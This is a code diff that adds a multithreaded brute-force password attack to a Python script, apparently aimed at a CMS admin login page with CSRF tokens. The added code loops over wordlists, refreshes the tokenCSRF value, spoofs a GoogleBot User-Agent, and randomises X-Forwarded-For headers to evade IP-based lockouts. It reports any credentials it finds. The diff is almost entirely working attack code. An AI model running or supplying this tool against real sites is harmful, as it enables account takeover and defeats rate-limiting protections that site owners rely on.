@@ -10,6 +10,12 @@ import threading
 import argparse
 
 
+# don't modify this variables
+credentials = ""
+attempts = 0
+percent = 0
+total = 0
+
 def banner():
     print("No banner yet")
 
@@ -21,20 +27,77 @@ def argument_parser():
     parser.add_argument("-p","--port",default=80,type=int,help="specify port...  Default[p:80]",metavar="")
     parser.add_argument("-U","--username",type=str,required=True,help="specify username. It can be a username or a path",metavar="")
     parser.add_argument("-P","--password",type=str,required=True,help="specify password. It can be a password or a path",metavar="")
-    parser.add_argument("-t","--threads",type=int,help="specify threads... Default[t:1]",metavar="")
+    parser.add_argument("-t","--threads",default=1,type=int,help="specify threads... Default[t:1]",metavar="")
     parser.add_argument("-T","--timeout",type=int,help="specify timeout in seconds... Default[30]",metavar="")
     args = parser.parse_args()
     return args
 
 def argument_checker(args):
+    global attempts,total
     wordlistpair = argument_checker_wordlist(args.username,args.password)
-    print(wordlistpair)
-    exit()
-    
-    HTTPHandler = client.HTTPConnection(args.host,args.port)
-    HTTPHandler.connect()
-    HTTPHandler,cookie,token = argument_checker_host(HTTPHandler,args.host,args.path)
+    wordlistpair[1] = argument_checker_wordlistsplitter(wordlistpair[1],args.threads)
+    for username in wordlistpair[0]:
+        attempts = 0
+        for key in wordlistpair[1].keys():
+            HTTPHandler = client.HTTPConnection(args.host,args.port)
+            HTTPHandler.connect()
+            HTTPHandler,cookie,token = argument_checker_host(HTTPHandler,args.host,args.path) 
+            thread = threading.Thread(target=login_thread, args=(HTTPHandler, username,wordlistpair[1][key],args.host,args.port,args.timeout,args.path,token,cookie))
+            thread.start()
 
+def login_thread(HTTPHandler, username, pswdict, host, port, timeout, path, token, cookie):
+    global credentials,percent,attempts,total
+    for password in pswdict:
+        if len(credentials) > 0:
+            exit()
+        bodydata = "tokenCSRF={}&username={}&password={}&save=".format(token,username,password)
+        header = {
+            "Host":host,
+            "User-Agent":"GoogleBot",
+            "X-Forwarded-For":random_ip_generator(),
+            "Content-Type":"application/x-www-form-urlencoded",
+            "Content-length":len(bodydata),
+            "DNT":"1",
+            "Connection":"close",
+            "Cookie":cookie
+        }
+        print(" %03d %03d %08d  | %s:%-40s"%(threading.active_count(),percent,attempts,username,password),end="\r")
+        attempts += 1
+        percent = (attempts*100)//total
+        try:
+            token = POST_request(HTTPHandler,header,bodydata,path)
+        except:
+            print("[*] Error: %s:%s%40s"%(username,password," "))
+            break
+        if token == True:
+            print(f"\n\n[!] FOUND: {username}:{password}")
+            credentials = "{}:{}".format(username,password)
+            exit()
+        elif token == False:
+            print("[*] Unable to get token...")
+        else:
+            continue
+        
+def random_ip_generator():
+    return "{}.{}.{}.{}".format(random.randint(10,255), random.randint(10,255), \
+                                random.randint(10,255), random.randint(10,255))        
+
+def POST_request(HTTPHandler, head:dict, data, path):
+    """ try to loging, if sucess return true, else return token to keep trying"""
+    HTTPHandler.request("POST",path,body=data,headers=head)
+    response = HTTPHandler.getresponse()
+
+    token = research('input.+?name="tokenCSRF".+?value="(.+?)"',response.read().decode())
+    new_path = response.getheader("Location")
+    if new_path != None:
+        return True
+    elif token == None:
+        print("\n[!] No token found...")
+        return False
+    else:
+        token = token.group(1)
+        return token    
+            
 def argument_checker_wordlist(username,password):    
     wordlistpair = [username,password]
     for i in range(2):
@@ -44,6 +107,24 @@ def argument_checker_wordlist(username,password):
             wordlistpair[i] = open(wordlistpair[i], 'r', encoding="latin-1").read()
         wordlistpair[i] = wordlistpair[i].split("\n")
     return wordlistpair
+
+def argument_checker_wordlistsplitter(wordlist,threads):
+    global total
+    pswdict = dict()
+    aux1 = aux2 = aux3 = 0
+    width = (len(wordlist)-1)//threads
+    total = len(wordlist)
+    for i in itertools.count(width,width):  # dividing pass wordlist per threads
+        if i >= (len(wordlist)-1):
+            i = i-(i-(len(wordlist)-1))
+            aux3 = 1
+        pswdict[aux1] = wordlist[aux2:i]
+        aux1 += 1
+        aux2 = i
+        if aux3 == 1:
+            break
+    del aux1,aux2,aux3,width
+    return pswdict
 
 def argument_checker_host(HTTPHandler,host,path):
     header = {
@@ -141,7 +222,6 @@ def POST_request(HTTPHandler, head:dict, data, path):
     else:
         token = token.group(1)
         return token
-
     
 def MainFunction(username,passwordlist,server,port=80,timeout=10,path="/admin/login"):
     global credentials,percent,attempts,total
